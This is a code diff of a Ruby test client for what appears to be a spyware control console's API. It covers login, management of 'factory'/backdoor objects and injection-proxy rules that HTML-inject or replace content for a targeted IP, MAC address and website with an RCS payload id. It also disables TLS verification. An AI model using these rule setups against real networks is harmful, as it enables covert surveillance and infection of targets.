@@ -3,11 +3,20 @@ require 'json'
 require 'benchmark'
 require 'open-uri'
 require 'pp'
+require 'cgi'
 
 #http = Net::HTTP.new('192.168.1.189', 4444)
 http = Net::HTTP.new('localhost', 4444)
 http.use_ssl = true
 http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+
+# auth create admin
+#account = {
+#  :pass => 'adminp123'
+#  }
+#resp = http.request_post('/auth/reset', account.to_json, nil)
+#puts "auth.create"
+#puts resp.body
 
 # login
 account = {
@@ -16,7 +25,7 @@ account = {
   }
 resp = http.request_post('/auth/login', account.to_json, nil)
 puts "auth.login"
-puts resp.body
+puts resp
 cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
 puts "cookie " + cookie
 puts
@@ -351,19 +360,17 @@ if false
   proxy_id = 0
   
   # proxy.index
-  res = http.request_get('/proxy', {'Cookie' => cookie})
-  puts "proxy.index"
-  puts res.body
-  puts
+  #res = http.request_get('/proxy', {'Cookie' => cookie})
+  #puts "proxy.index"
+  #puts res.body
+  #puts
   
-  proxies = JSON.parse(res.body)
-  proxies.each do |proxy|
-    if proxy['_mid'] == 3
-      proxy_id = proxy['_id']
-    end
-  #  puts proxy
-  #  puts
-  end
+  #proxies = JSON.parse(res.body)
+  #proxies.each do |proxy|
+  #  if proxy['_mid'] == 3
+  #    proxy_id = proxy['_id']
+  #  end
+  #end
   
   # proxy.delete
   #proxies.each do |proxy|
@@ -380,10 +387,11 @@ if false
   puts
   
   test_proxy = JSON.parse(res.body)
+  proxy_id = test_proxy['_id']
   
   # proxy.update
   proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
-  res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
+  res = http.request_put("/proxy/#{proxy_id}", proxy.to_json, {'Cookie' => cookie}) 
   puts "proxy.update "
   puts res
   puts
@@ -402,7 +410,7 @@ if false
   puts
   
   # proxy.log
-  res = http.request_get("/proxy/log/#{proxy_id}", {'Cookie' => cookie})
+  res = http.request_get("/proxy/logs/#{proxy_id}", {'Cookie' => cookie})
   puts "proxy.log"
   puts res
   puts
@@ -411,11 +419,11 @@ if false
   puts "proxy.add_rule"
   rule = {rule: {enabled: true, disable_sync: false, ident: 'STATIC-IP', 
           ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
-          action: 'INJECT-HTML', action_param: 'RCS_0000602', target_id: '4e033ae62afb65e061000056'}}
+          action: 'INJECT-HTML', action_param: 'RCS_0000602', target_id: ['4e314a052afb65157900005a']}}
   res = http.request_post("/proxy/add_rule/#{proxy_id}", rule.to_json, {'Cookie' => cookie})
 
   rule = JSON.parse(res.body)
-  #puts rule
+  puts rule
   puts
   
   # proxy.rules
@@ -426,10 +434,18 @@ if false
   #puts proxy['rules'].inspect
   puts
   
+  # upload.create
+  res = http.request_post('/upload', "abracadabra", {'Cookie' => cookie})
+  puts "upload.create"
+  puts res.body
+  puts
+  
+  upload_id = res.body
+  
   # proxy.update_rule
   puts "proxy.update_rule"
   mod = {rule: {_id: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
-          ident_param: '00:11:22:33:44:55', target_id: '4e033ae62afb65e061000056'}}
+          ident_param: '00:11:22:33:44:55', target_id: ['4e314a052afb65157900005a'], action: 'REPLACE', action_param: upload_id}}
   res = http.request_post("/proxy/update_rule/#{proxy_id}", mod.to_json, {'Cookie' => cookie})
   puts res
   puts
@@ -455,6 +471,11 @@ if false
   puts res
   puts
 
+  # proxy.delete
+  puts "proxy.delete"
+  ret = http.delete("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  puts ret
+  
 end
 
 # collector
@@ -693,7 +714,7 @@ if false
 end
 
 # factories
-if true
+if false
   res = http.request_get('/operation', {'Cookie' => cookie})
   operations = JSON.parse(res.body)
   
@@ -729,7 +750,7 @@ if true
   backdoor_post = {
      _id: factory['_id'],
      name: "RENAMED!!!", 
-     desc: "whoa! this is our renamed backdoor", 
+     desc: "whoa! this is our renamed factory", 
      ident: "this field MUST NOT be updated!!!!!!!!!!!!"
    }
   res = http.request_post("/factory/update", backdoor_post.to_json, {'Cookie' => cookie})
@@ -744,21 +765,77 @@ if true
   puts
 end
 
-# items
+# search
 if false
-  # item.index
-  puts "item.index" 
-  res = http.request_get('/item', {'Cookie' => cookie})
+  # search.index
+  puts "search.index" 
+  res = http.request_get('/search', {'Cookie' => cookie})
   items = JSON.parse(res.body)
   puts "You've got #{items.size} items."
   puts
   
-  # item.index
-  puts "item.index RCS_0000000610"
-  res = http.request_get(URI.escape('/item?filter={"name": "RCS_0000000610"}'), {'Cookie' => cookie})
+  # search.index with filter
+  puts "search.index RCS_0000000610"
+  res = http.request_get(URI.escape('/search?filter={"name": "RCS_0000000610"}'), {'Cookie' => cookie})
   rcs_10 = JSON.parse(res.body)
   puts rcs_10
   puts
+end
+
+#upload
+if false
+  # upload.create
+  res = http.request_post('/upload', "abracadabra", {'Cookie' => cookie})
+  puts "upload.create"
+  puts res
+  puts
+end
+
+# version
+if false
+  # version.index
+  puts "version.index" 
+  res = http.request_get('/version', {'Cookie' => cookie})
+  versions = JSON.parse(res.body)
+  puts versions
+  puts
+  
+  # version.show
+  puts "version.show" 
+  res = http.request_get("/version/#{versions['console']}", {'Cookie' => cookie})
+  puts res
+  puts
+  
+  
+end
+
+# shards
+if true
+  # shard.index
+  puts "shard.index" 
+  res = http.request_get('/shard', {'Cookie' => cookie})
+  shards = JSON.parse(res.body)
+  puts res.body
+  puts
+  
+  shards['shards'].each do |shard|
+    puts 'shard.show ' + shard['host']
+    res = http.request_get("/shard/#{shard['_id']}", {'Cookie' => cookie})
+    puts res.body
+    puts
+  end
+
+  # shard.create
+  #res = http.request_post('/shard/create', {host: "localhost:27027"}.to_json, {'Cookie' => cookie})
+  #puts "shard.create"
+  #puts res
+  #puts
+  
+  # shard.index
+  #puts "shard.index" 
+  #res = http.request_get('/shard', {'Cookie' => cookie})
+  #puts res.body
+  #puts
 end
 
 # logout
